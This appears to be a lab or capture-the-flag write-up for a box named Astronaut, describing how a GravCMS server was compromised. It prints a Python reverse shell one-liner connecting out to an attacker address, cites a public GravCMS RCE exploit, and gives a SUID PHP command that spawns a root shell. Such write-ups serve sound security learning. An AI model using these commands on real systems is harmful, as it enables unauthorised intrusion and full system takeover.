---
icon: linux
---

# Astronaut

## Summary

* Apache server hosting GravCMS was found on port 80.
* Exploited a known GravCMS RCE vulnerability to get a foothold.
* Used a one-liner Python reverse shell for stable access (as Meterpreter was unstable).
* Privilege escalation achieved via **SUID misconfiguration in PHP binary**.



## 🧵 Let's Unpack

***

**Enumeration**

```bash
sudo nmap -sV -sC -p- -Pn 192.168.229.12
```

Open Ports:

* `22/tcp` → OpenSSH 8.2p1
* `80/tcp` → Apache httpd 2.4.41, directory listing reveals: `/grav-admin`

***

**Initial Foothold**

**🔍 Target: GravCMS (on `/grav-admin`)**

* Public exploit found:
  * [Exploit-DB #49973](https://www.exploit-db.com/exploits/49973)
  * Also available as a Metasploit module: `exploit/linux/http/gravcms_exec`

**⚙️ Execution**

1. Meterpreter payload was unstable.
2.  Used a **Python one-liner reverse shell** for stability:

    ```bash
    export RHOST="192.168.45.207";export RPORT=9999;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
    ```

✅ Got a stable shell as www-data.

***

**Privilege Escalation**

1.  **SUID Binaries Enumeration**:

    ```bash
    find / -perm -4000 -type f -exec ls -la {} 2>/dev/null
    ```

    * Found: `php` with **SUID bit set**
2.  **Exploit**: Abuse SUID PHP to execute shell with elevated privileges

    ```bash
    php -r "pcntl_exec('/bin/sh', ['-p']);"
    ```

✅ Got root shell!
